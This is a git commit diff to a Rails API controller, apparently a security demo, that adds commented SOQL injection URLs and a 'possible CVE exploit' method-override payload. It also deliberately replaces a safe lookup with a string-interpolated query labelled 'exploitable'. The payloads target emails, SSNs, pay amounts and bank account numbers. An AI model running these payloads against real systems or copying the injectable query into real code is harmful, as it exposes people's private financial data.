e1ab582f13634874bf86776395fd9eef987f0f11
Ken Kantzer <ken@pkcsecurity.com>
2019-02-28 11:03:24 -0800

    updating some of the exploit payloads in people_controller.rb

--- app/controllers/api/people_controller.rb
+++ app/controllers/api/people_controller.rb
@@ -1,14 +1,19 @@
+# SOME QUERIES YOU CAN RUN
+# a working query, as intended
 # http://0.0.0.0:3000/api/people?account_id=0011U00000DVztTQAT
-# generic detection
-# http://0.0.0.0:3000/api/people?account_id=0011U00000DVztTQAZ' OR CreatedBy.Contact.Email like 'a%25
-# http://0.0.0.0:3000/api/people?account_id=0011U00000DVztTQAZ' OR Client__r.SSN__c like '123%25
+# pretty generic detection, since all objects are by default created by someone with an email
+# http://0.0.0.0:3000/api/people?account_id=' OR CreatedBy.Email like '%25
+# let's get some other account names..
+# http://0.0.0.0:3000/api/people?account_id=' OR Account.Name like 'G%25
+# let's see if we can find an interesting table that's connected
+# http://0.0.0.0:3000/api/people?account_id=' OR Client__r.SSN__c like '123%25
 # this doesn't work...
-# http://0.0.0.0:3000/api/people?account_id=0011U00000DVztTQAZ' OR Client__r.Paychex_Stub__r.Amount__c > '100
+# http://0.0.0.0:3000/api/people?account_id=' OR Client__r.Paychex_Stub__r.Amount__c > '100
 # this does work!
-# http://0.0.0.0:3000/api/people?account_id=0011U00000DVztTQAZ' OR Client__r.Paychex_Stub__r.Amount__c > 92125 OR Account.Name like 'grawefawawev%25
+# http://0.0.0.0:3000/api/people?account_id=' OR Client__r.Paychex_Stub__r.Amount__c > 92125 OR Account.Name like 'grawefawawev%25
 # three levels deep
-# http://0.0.0.0:3000/api/people?account_id=0011U00000DVztTQAZ' OR Client__r.Paychex_Stub__r.Bank_Account__r.Account_Number__c like '9%25
-# CVE exploit
+# http://0.0.0.0:3000/api/people?account_id=' OR Client__r.Paychex_Stub__r.Bank_Account__r.Account_Number__c like '9%25
+# possible CVE exploit
 # http://0.0.0.0:3000/api/people?account_id=0011U00000DVztTQAT%3Fshould_get_paid%3Dtrue%26_HttpMethod%3DPATCH
 
 class API::PeopleController < ApplicationController
@@ -21,13 +26,15 @@ class API::PeopleController < ApplicationController
                                client_id: ENV['SALESFORCE_CLIENT_ID'],
                                client_secret: ENV['SALESFORCE_CLIENT_SECRET'],
                                api_version: '45.0')
-        #accounts = client.query("select Name, LastModifiedBy.Name from Account where Id = '#{account_id}'")
-        #account = accounts.first
 
-        supposedlySafeResult = client.find('Account', account_id)
+        # an exploitable query
+        accounts = client.query("select Name, LastModifiedBy.Name from Account where Id = '#{account_id}'")
+        account = accounts.first
+        print account + '\n'
+        render json: account.Name
 
-        #print account + '\n'
-        #render json: account
-        render json: supposedlySafeResult.Name
+        # a supposedly safer query
+        # supposedlySafeResult = client.find('Account', account_id)
+        # render json: supposedlySafeResult.Name
     end
 end
